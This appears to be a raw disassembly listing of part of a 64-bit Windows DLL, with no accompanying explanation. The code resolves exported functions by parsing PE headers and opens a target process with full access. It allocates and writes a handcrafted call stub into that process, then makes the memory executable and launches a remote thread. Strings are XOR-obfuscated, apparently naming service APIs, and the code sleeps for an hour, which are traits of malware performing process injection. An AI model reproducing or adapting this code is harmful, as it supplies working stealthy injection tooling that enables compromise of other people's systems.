   18000175e:	c7 44 24 70 30 00 00 	movl   $0x30,0x70(%rsp)
   180001765:	00 
   180001766:	ba ff ff 1f 00       	mov    $0x1fffff,%edx
   18000176b:	4c 89 7c 24 78       	mov    %r15,0x78(%rsp)
   180001770:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   180001775:	44 89 7d 88          	mov    %r15d,-0x78(%rbp)
   180001779:	f3 0f 7f 45 90       	movdqu %xmm0,-0x70(%rbp)
   18000177e:	4c 89 7d 80          	mov    %r15,-0x80(%rbp)
   180001782:	4c 89 7c 24 68       	mov    %r15,0x68(%rsp)
   180001787:	e8 c4 0a 00 00       	call   0x180002250
   18000178c:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   180001791:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   180001795:	48 83 f8 fd          	cmp    $0xfffffffffffffffd,%rax
   180001799:	77 51                	ja     0x1800017ec
   18000179b:	33 c0                	xor    %eax,%eax
   18000179d:	44 88 7d b0          	mov    %r15b,-0x50(%rbp)
   1800017a1:	48 89 45 b1          	mov    %rax,-0x4f(%rbp)
   1800017a5:	45 8b c6             	mov    %r14d,%r8d
   1800017a8:	88 45 b9             	mov    %al,-0x47(%rbp)
   1800017ab:	48 8b d3             	mov    %rbx,%rdx
   1800017ae:	48 8d 45 b0          	lea    -0x50(%rbp),%rax
   1800017b2:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1800017b7:	e8 d0 01 00 00       	call   0x18000198c
   1800017bc:	48 8b d8             	mov    %rax,%rbx
   1800017bf:	48 85 c0             	test   %rax,%rax
   1800017c2:	74 28                	je     0x1800017ec
   1800017c4:	45 33 c0             	xor    %r8d,%r8d
   1800017c7:	33 d2                	xor    %edx,%edx
   1800017c9:	48 8b c8             	mov    %rax,%rcx
   1800017cc:	e8 7f 0b 00 00       	call   0x180002350
   1800017d1:	48 8d 54 24 48       	lea    0x48(%rsp),%rdx
   1800017d6:	48 8b cb             	mov    %rbx,%rcx
   1800017d9:	ff 15 29 28 00 00    	call   *0x2829(%rip)        # 0x180004008
   1800017df:	85 c0                	test   %eax,%eax
   1800017e1:	74 09                	je     0x1800017ec
   1800017e3:	89 3e                	mov    %edi,(%rsi)
   1800017e5:	b8 01 00 00 00       	mov    $0x1,%eax
   1800017ea:	eb 02                	jmp    0x1800017ee
   1800017ec:	33 c0                	xor    %eax,%eax
   1800017ee:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
   1800017f2:	48 33 cc             	xor    %rsp,%rcx
   1800017f5:	e8 a6 0b 00 00       	call   0x1800023a0
   1800017fa:	4c 8d 9c 24 40 01 00 	lea    0x140(%rsp),%r11
   180001801:	00 
   180001802:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   180001806:	49 8b 73 30          	mov    0x30(%r11),%rsi
   18000180a:	49 8b 7b 38          	mov    0x38(%r11),%rdi
   18000180e:	49 8b e3             	mov    %r11,%rsp
   180001811:	41 5f                	pop    %r15
   180001813:	41 5e                	pop    %r14
   180001815:	5d                   	pop    %rbp
   180001816:	c3                   	ret
   180001817:	cc                   	int3
   180001818:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000181d:	44 8b c1             	mov    %ecx,%r8d
   180001820:	b8 0b 01 00 00       	mov    $0x10b,%eax
   180001825:	48 63 4a 3c          	movslq 0x3c(%rdx),%rcx
   180001829:	48 03 ca             	add    %rdx,%rcx
   18000182c:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   180001830:	74 0b                	je     0x18000183d
   180001832:	b8 0b 02 00 00       	mov    $0x20b,%eax
   180001837:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   18000183b:	75 49                	jne    0x180001886
   18000183d:	0f b7 59 06          	movzwl 0x6(%rcx),%ebx
   180001841:	b8 14 00 00 00       	mov    $0x14,%eax
   180001846:	48 8b d1             	mov    %rcx,%rdx
   180001849:	44 0f b7 0c 08       	movzwl (%rax,%rcx,1),%r9d
   18000184e:	4c 03 c9             	add    %rcx,%r9
   180001851:	45 3b 41 2c          	cmp    0x2c(%r9),%r8d
   180001855:	73 05                	jae    0x18000185c
   180001857:	41 8b c0             	mov    %r8d,%eax
   18000185a:	eb 2c                	jmp    0x180001888
   18000185c:	33 d2                	xor    %edx,%edx
   18000185e:	eb 21                	jmp    0x180001881
   180001860:	0f b7 c2             	movzwl %dx,%eax
   180001863:	4c 8d 14 80          	lea    (%rax,%rax,4),%r10
   180001867:	47 8b 5c d1 24       	mov    0x24(%r9,%r10,8),%r11d
   18000186c:	45 3b c3             	cmp    %r11d,%r8d
   18000186f:	72 0d                	jb     0x18000187e
   180001871:	43 8b 4c d1 28       	mov    0x28(%r9,%r10,8),%ecx
   180001876:	41 03 cb             	add    %r11d,%ecx
   180001879:	44 3b c1             	cmp    %ecx,%r8d
   18000187c:	72 10                	jb     0x18000188e
   18000187e:	66 ff c2             	inc    %dx
   180001881:	66 3b d3             	cmp    %bx,%dx
   180001884:	72 da                	jb     0x180001860
   180001886:	33 c0                	xor    %eax,%eax
   180001888:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   18000188d:	c3                   	ret
   18000188e:	43 8b 44 d1 2c       	mov    0x2c(%r9,%r10,8),%eax
   180001893:	41 2b c3             	sub    %r11d,%eax
   180001896:	41 03 c0             	add    %r8d,%eax
   180001899:	eb ed                	jmp    0x180001888
   18000189b:	cc                   	int3
   18000189c:	48 8b c4             	mov    %rsp,%rax
   18000189f:	48 89 58 08          	mov    %rbx,0x8(%rax)
   1800018a3:	48 89 68 10          	mov    %rbp,0x10(%rax)
   1800018a7:	48 89 70 18          	mov    %rsi,0x18(%rax)
   1800018ab:	48 89 78 20          	mov    %rdi,0x20(%rax)
   1800018af:	41 56                	push   %r14
   1800018b1:	48 83 ec 20          	sub    $0x20,%rsp
   1800018b5:	48 8b d9             	mov    %rcx,%rbx
   1800018b8:	b8 0b 01 00 00       	mov    $0x10b,%eax
   1800018bd:	48 63 49 3c          	movslq 0x3c(%rcx),%rcx
   1800018c1:	48 03 cb             	add    %rbx,%rcx
   1800018c4:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   1800018c8:	75 07                	jne    0x1800018d1
   1800018ca:	b8 78 00 00 00       	mov    $0x78,%eax
   1800018cf:	eb 10                	jmp    0x1800018e1
   1800018d1:	b8 0b 02 00 00       	mov    $0x20b,%eax
   1800018d6:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   1800018da:	75 6d                	jne    0x180001949
   1800018dc:	b8 88 00 00 00       	mov    $0x88,%eax
   1800018e1:	8b 0c 08             	mov    (%rax,%rcx,1),%ecx
   1800018e4:	48 8b d3             	mov    %rbx,%rdx
   1800018e7:	e8 2c ff ff ff       	call   0x180001818
   1800018ec:	44 8b f0             	mov    %eax,%r14d
   1800018ef:	48 8b d3             	mov    %rbx,%rdx
   1800018f2:	4c 03 f3             	add    %rbx,%r14
   1800018f5:	41 8b 4e 20          	mov    0x20(%r14),%ecx
   1800018f9:	e8 1a ff ff ff       	call   0x180001818
   1800018fe:	41 8b 4e 24          	mov    0x24(%r14),%ecx
   180001902:	48 8b d3             	mov    %rbx,%rdx
   180001905:	8b f8                	mov    %eax,%edi
   180001907:	48 03 fb             	add    %rbx,%rdi
   18000190a:	e8 09 ff ff ff       	call   0x180001818
   18000190f:	41 8b 6e 18          	mov    0x18(%r14),%ebp
   180001913:	8b f0                	mov    %eax,%esi
   180001915:	48 03 f3             	add    %rbx,%rsi
   180001918:	eb 2b                	jmp    0x180001945
   18000191a:	8b 0f                	mov    (%rdi),%ecx
   18000191c:	48 8b d3             	mov    %rbx,%rdx
   18000191f:	ff cd                	dec    %ebp
   180001921:	e8 f2 fe ff ff       	call   0x180001818
   180001926:	8b c8                	mov    %eax,%ecx
   180001928:	48 8d 15 d9 29 00 00 	lea    0x29d9(%rip),%rdx        # 0x180004308
   18000192f:	48 03 cb             	add    %rbx,%rcx
   180001932:	ff 15 80 27 00 00    	call   *0x2780(%rip)        # 0x1800040b8
   180001938:	48 85 c0             	test   %rax,%rax
   18000193b:	75 29                	jne    0x180001966
   18000193d:	48 83 c7 04          	add    $0x4,%rdi
   180001941:	48 83 c6 02          	add    $0x2,%rsi
   180001945:	85 ed                	test   %ebp,%ebp
   180001947:	75 d1                	jne    0x18000191a
   180001949:	33 c0                	xor    %eax,%eax
   18000194b:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180001950:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   180001955:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   18000195a:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   18000195f:	48 83 c4 20          	add    $0x20,%rsp
   180001963:	41 5e                	pop    %r14
   180001965:	c3                   	ret
   180001966:	41 8b 4e 1c          	mov    0x1c(%r14),%ecx
   18000196a:	48 8b d3             	mov    %rbx,%rdx
   18000196d:	e8 a6 fe ff ff       	call   0x180001818
   180001972:	44 0f b7 06          	movzwl (%rsi),%r8d
   180001976:	48 8b d3             	mov    %rbx,%rdx
   180001979:	8b c8                	mov    %eax,%ecx
   18000197b:	48 03 cb             	add    %rbx,%rcx
   18000197e:	42 8b 0c 81          	mov    (%rcx,%r8,4),%ecx
   180001982:	e8 91 fe ff ff       	call   0x180001818
   180001987:	eb c2                	jmp    0x18000194b
   180001989:	cc                   	int3
   18000198a:	cc                   	int3
   18000198b:	cc                   	int3
   18000198c:	40 53                	rex push %rbx
   18000198e:	56                   	push   %rsi
   18000198f:	57                   	push   %rdi
   180001990:	41 54                	push   %r12
   180001992:	41 55                	push   %r13
   180001994:	41 56                	push   %r14
   180001996:	41 57                	push   %r15
   180001998:	48 81 ec 10 01 00 00 	sub    $0x110,%rsp
   18000199f:	48 8b 05 5a 46 00 00 	mov    0x465a(%rip),%rax        # 0x180006000
   1800019a6:	48 33 c4             	xor    %rsp,%rax
   1800019a9:	48 89 84 24 00 01 00 	mov    %rax,0x100(%rsp)
   1800019b0:	00 
   1800019b1:	41 8b f0             	mov    %r8d,%esi
   1800019b4:	48 8b fa             	mov    %rdx,%rdi
   1800019b7:	48 8b d9             	mov    %rcx,%rbx
   1800019ba:	4c 8b a4 24 78 01 00 	mov    0x178(%rsp),%r12
   1800019c1:	00 
   1800019c2:	45 33 ed             	xor    %r13d,%r13d
   1800019c5:	4c 89 6c 24 68       	mov    %r13,0x68(%rsp)
   1800019ca:	48 85 c9             	test   %rcx,%rcx
   1800019cd:	0f 84 49 02 00 00    	je     0x180001c1c
   1800019d3:	48 85 d2             	test   %rdx,%rdx
   1800019d6:	0f 84 40 02 00 00    	je     0x180001c1c
   1800019dc:	45 85 c0             	test   %r8d,%r8d
   1800019df:	0f 84 37 02 00 00    	je     0x180001c1c
   1800019e5:	48 63 42 3c          	movslq 0x3c(%rdx),%rax
   1800019e9:	0f b7 54 10 18       	movzwl 0x18(%rax,%rdx,1),%edx
   1800019ee:	b8 0b 01 00 00       	mov    $0x10b,%eax
   1800019f3:	41 8d 4d 02          	lea    0x2(%r13),%ecx
   1800019f7:	66 3b d0             	cmp    %ax,%dx
   1800019fa:	75 05                	jne    0x180001a01
   1800019fc:	8d 41 ff             	lea    -0x1(%rcx),%eax
   1800019ff:	eb 10                	jmp    0x180001a11
   180001a01:	41 8b c5             	mov    %r13d,%eax
   180001a04:	41 b8 0b 02 00 00    	mov    $0x20b,%r8d
   180001a0a:	66 41 3b d0          	cmp    %r8w,%dx
   180001a0e:	0f 44 c1             	cmove  %ecx,%eax
   180001a11:	3b c1                	cmp    %ecx,%eax
   180001a13:	0f 85 03 02 00 00    	jne    0x180001c1c
   180001a19:	48 8b cf             	mov    %rdi,%rcx
   180001a1c:	e8 7b fe ff ff       	call   0x18000189c
   180001a21:	44 8b f0             	mov    %eax,%r14d
   180001a24:	85 c0                	test   %eax,%eax
   180001a26:	0f 84 f0 01 00 00    	je     0x180001c1c
   180001a2c:	8d 56 40             	lea    0x40(%rsi),%edx
   180001a2f:	48 89 54 24 70       	mov    %rdx,0x70(%rsp)
   180001a34:	4c 89 6c 24 60       	mov    %r13,0x60(%rsp)
   180001a39:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   180001a40:	00 
   180001a41:	c7 44 24 20 00 30 00 	movl   $0x3000,0x20(%rsp)
   180001a48:	00 
   180001a49:	4c 8d 4c 24 70       	lea    0x70(%rsp),%r9
   180001a4e:	45 33 c0             	xor    %r8d,%r8d
   180001a51:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   180001a56:	48 8b cb             	mov    %rbx,%rcx
   180001a59:	e8 32 08 00 00       	call   0x180002290
   180001a5e:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   180001a63:	48 85 d2             	test   %rdx,%rdx
   180001a66:	0f 84 b0 01 00 00    	je     0x180001c1c
   180001a6c:	4c 8b fe             	mov    %rsi,%r15
   180001a6f:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   180001a74:	4c 8b ce             	mov    %rsi,%r9
   180001a77:	4c 8b c7             	mov    %rdi,%r8
   180001a7a:	48 8b cb             	mov    %rbx,%rcx
   180001a7d:	e8 8e 07 00 00       	call   0x180002210
   180001a82:	85 c0                	test   %eax,%eax
   180001a84:	0f 85 92 01 00 00    	jne    0x180001c1c
   180001a8a:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   180001a8f:	4a 8d 34 30          	lea    (%rax,%r14,1),%rsi
   180001a93:	49 8d 3c 07          	lea    (%r15,%rax,1),%rdi
   180001a97:	48 89 bc 24 90 00 00 	mov    %rdi,0x90(%rsp)
   180001a9e:	00 
   180001a9f:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   180001aa4:	45 33 c9             	xor    %r9d,%r9d
   180001aa7:	4d 8b c4             	mov    %r12,%r8
   180001aaa:	48 8d 94 24 90 00 00 	lea    0x90(%rsp),%rdx
   180001ab1:	00 
   180001ab2:	48 8b cb             	mov    %rbx,%rcx
   180001ab5:	e8 56 07 00 00       	call   0x180002210
   180001aba:	85 c0                	test   %eax,%eax
   180001abc:	0f 85 5a 01 00 00    	jne    0x180001c1c
   180001ac2:	44 88 ac 24 e4 00 00 	mov    %r13b,0xe4(%rsp)
   180001ac9:	00 
   180001aca:	4c 89 ac 24 f7 00 00 	mov    %r13,0xf7(%rsp)
   180001ad1:	00 
   180001ad2:	44 88 ac 24 ff 00 00 	mov    %r13b,0xff(%rsp)
   180001ad9:	00 
   180001ada:	48 89 b4 24 98 00 00 	mov    %rsi,0x98(%rsp)
   180001ae1:	00 
   180001ae2:	44 89 6c 24 78       	mov    %r13d,0x78(%rsp)
   180001ae7:	48 89 bc 24 a0 00 00 	mov    %rdi,0xa0(%rsp)
   180001aee:	00 
   180001aef:	ba ab 5e 9b 1e       	mov    $0x1e9b5eab,%edx
   180001af4:	89 94 24 80 00 00 00 	mov    %edx,0x80(%rsp)
   180001afb:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   180001b00:	48 89 84 24 a8 00 00 	mov    %rax,0xa8(%rsp)
   180001b07:	00 
   180001b08:	4c 89 ac 24 b0 00 00 	mov    %r13,0xb0(%rsp)
   180001b0f:	00 
   180001b10:	b9 48 b9 00 00       	mov    $0xb948,%ecx
   180001b15:	66 89 8c 24 c0 00 00 	mov    %cx,0xc0(%rsp)
   180001b1c:	00 
   180001b1d:	4c 89 ac 24 c2 00 00 	mov    %r13,0xc2(%rsp)
   180001b24:	00 
   180001b25:	b9 48 ba 00 00       	mov    $0xba48,%ecx
   180001b2a:	66 89 8c 24 ca 00 00 	mov    %cx,0xca(%rsp)
   180001b31:	00 
   180001b32:	48 89 84 24 cc 00 00 	mov    %rax,0xcc(%rsp)
   180001b39:	00 
   180001b3a:	b8 41 b8 00 00       	mov    $0xb841,%eax
   180001b3f:	66 89 84 24 d4 00 00 	mov    %ax,0xd4(%rsp)
   180001b46:	00 
   180001b47:	89 94 24 d6 00 00 00 	mov    %edx,0xd6(%rsp)
   180001b4e:	b8 49 b9 00 00       	mov    $0xb949,%eax
   180001b53:	66 89 84 24 da 00 00 	mov    %ax,0xda(%rsp)
   180001b5a:	00 
   180001b5b:	48 89 bc 24 dc 00 00 	mov    %rdi,0xdc(%rsp)
   180001b62:	00 
   180001b63:	c6 84 24 e4 00 00 00 	movb   $0x68,0xe4(%rsp)
   180001b6a:	68 
   180001b6b:	44 89 ac 24 e5 00 00 	mov    %r13d,0xe5(%rsp)
   180001b72:	00 
   180001b73:	c7 84 24 e9 00 00 00 	movl   $0x20ec8348,0xe9(%rsp)
   180001b7a:	48 83 ec 20 
   180001b7e:	b8 48 b8 00 00       	mov    $0xb848,%eax
   180001b83:	66 89 84 24 ed 00 00 	mov    %ax,0xed(%rsp)
   180001b8a:	00 
   180001b8b:	48 89 b4 24 ef 00 00 	mov    %rsi,0xef(%rsp)
   180001b92:	00 
   180001b93:	66 c7 84 24 f7 00 00 	movw   $0xd0ff,0xf7(%rsp)
   180001b9a:	00 ff d0 
   180001b9d:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   180001ba2:	41 b9 39 00 00 00    	mov    $0x39,%r9d
   180001ba8:	4c 8d 84 24 c0 00 00 	lea    0xc0(%rsp),%r8
   180001baf:	00 
   180001bb0:	48 8b d7             	mov    %rdi,%rdx
   180001bb3:	48 8b cb             	mov    %rbx,%rcx
   180001bb6:	e8 55 06 00 00       	call   0x180002210
   180001bbb:	85 c0                	test   %eax,%eax
   180001bbd:	75 5d                	jne    0x180001c1c
   180001bbf:	48 8d 84 24 88 00 00 	lea    0x88(%rsp),%rax
   180001bc6:	00 
   180001bc7:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180001bcc:	41 b9 20 00 00 00    	mov    $0x20,%r9d
   180001bd2:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   180001bd7:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   180001bdc:	48 8b cb             	mov    %rbx,%rcx
   180001bdf:	e8 ec 05 00 00       	call   0x1800021d0
   180001be4:	4c 89 6c 24 50       	mov    %r13,0x50(%rsp)
   180001be9:	4c 89 6c 24 48       	mov    %r13,0x48(%rsp)
   180001bee:	4c 89 6c 24 40       	mov    %r13,0x40(%rsp)
   180001bf3:	4c 89 6c 24 38       	mov    %r13,0x38(%rsp)
   180001bf8:	44 89 6c 24 30       	mov    %r13d,0x30(%rsp)
   180001bfd:	4c 89 6c 24 28       	mov    %r13,0x28(%rsp)
   180001c02:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   180001c07:	4c 8b cb             	mov    %rbx,%r9
   180001c0a:	45 33 c0             	xor    %r8d,%r8d
   180001c0d:	ba ff ff 1f 00       	mov    $0x1fffff,%edx
   180001c12:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   180001c17:	e8 b4 06 00 00       	call   0x1800022d0
   180001c1c:	eb 06                	jmp    0x180001c24
   180001c1e:	48 83 64 24 68 00    	andq   $0x0,0x68(%rsp)
   180001c24:	48 8b 44 24 68       	mov    0x68(%rsp),%rax
   180001c29:	48 8b 8c 24 00 01 00 	mov    0x100(%rsp),%rcx
   180001c30:	00 
   180001c31:	48 33 cc             	xor    %rsp,%rcx
   180001c34:	e8 67 07 00 00       	call   0x1800023a0
   180001c39:	48 81 c4 10 01 00 00 	add    $0x110,%rsp
   180001c40:	41 5f                	pop    %r15
   180001c42:	41 5e                	pop    %r14
   180001c44:	41 5d                	pop    %r13
   180001c46:	41 5c                	pop    %r12
   180001c48:	5f                   	pop    %rdi
   180001c49:	5e                   	pop    %rsi
   180001c4a:	5b                   	pop    %rbx
   180001c4b:	c3                   	ret
   180001c4c:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   180001c51:	55                   	push   %rbp
   180001c52:	48 8d ac 24 b0 fc ff 	lea    -0x350(%rsp),%rbp
   180001c59:	ff 
   180001c5a:	48 81 ec 50 04 00 00 	sub    $0x450,%rsp
   180001c61:	48 8b 05 98 43 00 00 	mov    0x4398(%rip),%rax        # 0x180006000
   180001c68:	48 33 c4             	xor    %rsp,%rax
   180001c6b:	48 89 85 40 03 00 00 	mov    %rax,0x340(%rbp)
   180001c72:	89 0d 6c 44 00 00    	mov    %ecx,0x446c(%rip)        # 0x1800060e4
   180001c78:	33 db                	xor    %ebx,%ebx
   180001c7a:	89 8d 24 01 00 00    	mov    %ecx,0x124(%rbp)
   180001c80:	33 d2                	xor    %edx,%edx
   180001c82:	44 89 85 34 01 00 00 	mov    %r8d,0x134(%rbp)
   180001c89:	48 8d 4c 24 31       	lea    0x31(%rsp),%rcx
   180001c8e:	41 b8 ef 01 00 00    	mov    $0x1ef,%r8d
   180001c94:	89 9d 30 01 00 00    	mov    %ebx,0x130(%rbp)
   180001c9a:	c7 85 20 01 00 00 20 	movl   $0x20,0x120(%rbp)
   180001ca1:	00 00 00 
   180001ca4:	48 c7 85 28 01 00 00 	movq   $0x7,0x128(%rbp)
   180001cab:	07 00 00 00 
   180001caf:	c7 85 38 01 00 00 b8 	movl   $0xbb8,0x138(%rbp)
   180001cb6:	0b 00 00 
   180001cb9:	c7 44 24 20 ad 9b 8a 	movl   $0xad8a9bad,0x20(%rsp)
   180001cc0:	ad 
   180001cc1:	c7 44 24 24 9b 8c 88 	movl   $0x97888c9b,0x24(%rsp)
   180001cc8:	97 
   180001cc9:	c7 44 24 28 9d 9b ad 	movl   $0x8aad9b9d,0x28(%rsp)
   180001cd0:	8a 
   180001cd1:	c7 44 24 2c 9f 8a 8b 	movl   $0x8d8b8a9f,0x2c(%rsp)
   180001cd8:	8d 
   180001cd9:	c6 44 24 30 fe       	movb   $0xfe,0x30(%rsp)
   180001cde:	e8 b2 16 00 00       	call   0x180003395
   180001ce3:	33 d2                	xor    %edx,%edx
   180001ce5:	88 9d 40 01 00 00    	mov    %bl,0x140(%rbp)
   180001ceb:	41 b8 ff 01 00 00    	mov    $0x1ff,%r8d
   180001cf1:	48 8d 8d 41 01 00 00 	lea    0x141(%rbp),%rcx
   180001cf8:	e8 98 16 00 00       	call   0x180003395
   180001cfd:	8a 44 1c 20          	mov    0x20(%rsp,%rbx,1),%al
   180001d01:	34 fe                	xor    $0xfe,%al
   180001d03:	88 84 1d 40 01 00 00 	mov    %al,0x140(%rbp,%rbx,1)
   180001d0a:	48 ff c3             	inc    %rbx
   180001d0d:	48 81 fb 00 02 00 00 	cmp    $0x200,%rbx
   180001d14:	7c e7                	jl     0x180001cfd
   180001d16:	48 8b 0d 03 4b 00 00 	mov    0x4b03(%rip),%rcx        # 0x180006820
   180001d1d:	48 8d 95 40 01 00 00 	lea    0x140(%rbp),%rdx
   180001d24:	ff 15 ee 22 00 00    	call   *0x22ee(%rip)        # 0x180004018
   180001d2a:	48 8b 0d ff 4a 00 00 	mov    0x4aff(%rip),%rcx        # 0x180006830
   180001d31:	48 8d 95 20 01 00 00 	lea    0x120(%rbp),%rdx
   180001d38:	48 89 05 f9 4a 00 00 	mov    %rax,0x4af9(%rip)        # 0x180006838
   180001d3f:	ff d0                	call   *%rax
   180001d41:	48 8b 8d 40 03 00 00 	mov    0x340(%rbp),%rcx
   180001d48:	48 33 cc             	xor    %rsp,%rcx
   180001d4b:	e8 50 06 00 00       	call   0x1800023a0
   180001d50:	48 8b 9c 24 68 04 00 	mov    0x468(%rsp),%rbx
   180001d57:	00 
   180001d58:	48 81 c4 50 04 00 00 	add    $0x450,%rsp
   180001d5f:	5d                   	pop    %rbp
   180001d60:	c3                   	ret
   180001d61:	cc                   	int3
   180001d62:	cc                   	int3
   180001d63:	cc                   	int3
   180001d64:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001d69:	55                   	push   %rbp
   180001d6a:	48 8d ac 24 50 fa ff 	lea    -0x5b0(%rsp),%rbp
   180001d71:	ff 
   180001d72:	48 81 ec b0 06 00 00 	sub    $0x6b0,%rsp
   180001d79:	48 8b 05 80 42 00 00 	mov    0x4280(%rip),%rax        # 0x180006000
   180001d80:	48 33 c4             	xor    %rsp,%rax
   180001d83:	48 89 85 a0 05 00 00 	mov    %rax,0x5a0(%rbp)
   180001d8a:	48 8b da             	mov    %rdx,%rbx
   180001d8d:	e8 ba f3 ff ff       	call   0x18000114c
   180001d92:	33 d2                	xor    %edx,%edx
   180001d94:	c6 85 a0 01 00 00 00 	movb   $0x0,0x1a0(%rbp)
   180001d9b:	41 b8 ff 01 00 00    	mov    $0x1ff,%r8d
   180001da1:	48 8d 8d a1 01 00 00 	lea    0x1a1(%rbp),%rcx
   180001da8:	e8 e8 15 00 00       	call   0x180003395
   180001dad:	33 d2                	xor    %edx,%edx
   180001daf:	c7 44 24 30 ac 9b 99 	movl   $0x97999bac,0x30(%rsp)
   180001db6:	97 
   180001db7:	41 b8 e4 01 00 00    	mov    $0x1e4,%r8d
   180001dbd:	c7 44 24 34 8d 8a 9b 	movl   $0x8c9b8a8d,0x34(%rsp)
   180001dc4:	8c 
   180001dc5:	48 8d 4c 24 4c       	lea    0x4c(%rsp),%rcx
   180001dca:	c7 44 24 38 ad 9b 8c 	movl   $0x888c9bad,0x38(%rsp)
   180001dd1:	88 
   180001dd2:	c7 44 24 3c 97 9d 9b 	movl   $0xbd9b9d97,0x3c(%rsp)
   180001dd9:	bd 
   180001dda:	c7 44 24 40 8a 8c 92 	movl   $0xb6928c8a,0x40(%rsp)
   180001de1:	b6 
   180001de2:	c7 44 24 44 9f 90 9a 	movl   $0x929a909f,0x44(%rsp)
   180001de9:	92 
   180001dea:	c7 44 24 48 9b 8c a9 	movl   $0xfea98c9b,0x48(%rsp)
   180001df1:	fe 
   180001df2:	e8 9e 15 00 00       	call   0x180003395
   180001df7:	33 d2                	xor    %edx,%edx
   180001df9:	8a 44 14 30          	mov    0x30(%rsp,%rdx,1),%al
   180001dfd:	34 fe                	xor    $0xfe,%al
   180001dff:	88 84 15 a0 01 00 00 	mov    %al,0x1a0(%rbp,%rdx,1)
   180001e06:	48 ff c2             	inc    %rdx
   180001e09:	48 81 fa 00 02 00 00 	cmp    $0x200,%rdx
   180001e10:	7c e7                	jl     0x180001df9
   180001e12:	48 8b 0d 07 4a 00 00 	mov    0x4a07(%rip),%rcx        # 0x180006820
   180001e19:	48 8d 95 a0 01 00 00 	lea    0x1a0(%rbp),%rdx
   180001e20:	ff 15 f2 21 00 00    	call   *0x21f2(%rip)        # 0x180004018
   180001e26:	48 8b 0b             	mov    (%rbx),%rcx
   180001e29:	48 8d 15 14 01 00 00 	lea    0x114(%rip),%rdx        # 0x180001f44
   180001e30:	48 89 05 09 4a 00 00 	mov    %rax,0x4a09(%rip)        # 0x180006840
   180001e37:	ff d0                	call   *%rax
   180001e39:	48 89 05 f0 49 00 00 	mov    %rax,0x49f0(%rip)        # 0x180006830
   180001e40:	48 85 c0             	test   %rax,%rax
   180001e43:	0f 84 db 00 00 00    	je     0x180001f24
   180001e49:	b9 02 00 00 00       	mov    $0x2,%ecx
   180001e4e:	44 8d 41 ff          	lea    -0x1(%rcx),%r8d
   180001e52:	e8 f5 fd ff ff       	call   0x180001c4c
   180001e57:	45 33 c0             	xor    %r8d,%r8d
   180001e5a:	41 8d 48 04          	lea    0x4(%r8),%ecx
   180001e5e:	e8 e9 fd ff ff       	call   0x180001c4c
   180001e63:	83 64 24 20 00       	andl   $0x0,0x20(%rsp)
   180001e68:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180001e6d:	e8 b2 f7 ff ff       	call   0x180001624
   180001e72:	85 c0                	test   %eax,%eax
   180001e74:	0f 95 c3             	setne  %bl
   180001e77:	b9 80 ee 36 00       	mov    $0x36ee80,%ecx
   180001e7c:	ff 15 9e 21 00 00    	call   *0x219e(%rip)        # 0x180004020
   180001e82:	33 d2                	xor    %edx,%edx
   180001e84:	c6 85 a0 01 00 00 00 	movb   $0x0,0x1a0(%rbp)
   180001e8b:	41 b8 ff 03 00 00    	mov    $0x3ff,%r8d
   180001e91:	48 8d 8d a1 01 00 00 	lea    0x1a1(%rbp),%rcx
   180001e98:	e8 f8 14 00 00       	call   0x180003395
   180001e9d:	33 d2                	xor    %edx,%edx
   180001e9f:	c6 85 30 01 00 00 00 	movb   $0x0,0x130(%rbp)
   180001ea6:	48 8d 8d 31 01 00 00 	lea    0x131(%rbp),%rcx
   180001ead:	44 8d 42 63          	lea    0x63(%rdx),%r8d
   180001eb1:	e8 df 14 00 00       	call   0x180003395
   180001eb6:	33 c9                	xor    %ecx,%ecx
   180001eb8:	48 8d 05 99 42 00 00 	lea    0x4299(%rip),%rax        # 0x180006158
   180001ebf:	8a 04 01             	mov    (%rcx,%rax,1),%al
   180001ec2:	34 dd                	xor    $0xdd,%al
   180001ec4:	88 84 0d 30 01 00 00 	mov    %al,0x130(%rbp,%rcx,1)
   180001ecb:	48 ff c1             	inc    %rcx
   180001ece:	48 83 f9 0d          	cmp    $0xd,%rcx
   180001ed2:	7c e4                	jl     0x180001eb8
   180001ed4:	33 c9                	xor    %ecx,%ecx
   180001ed6:	8a 84 0d 30 01 00 00 	mov    0x130(%rbp,%rcx,1),%al
   180001edd:	88 84 0d a0 01 00 00 	mov    %al,0x1a0(%rbp,%rcx,1)
   180001ee4:	48 ff c1             	inc    %rcx
   180001ee7:	84 c0                	test   %al,%al
   180001ee9:	75 eb                	jne    0x180001ed6
   180001eeb:	48 8d 8d a0 01 00 00 	lea    0x1a0(%rbp),%rcx
   180001ef2:	e8 7d f4 ff ff       	call   0x180001374
   180001ef7:	84 db                	test   %bl,%bl
   180001ef9:	74 06                	je     0x180001f01
   180001efb:	3b 44 24 20          	cmp    0x20(%rsp),%eax
   180001eff:	74 0f                	je     0x180001f10
   180001f01:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
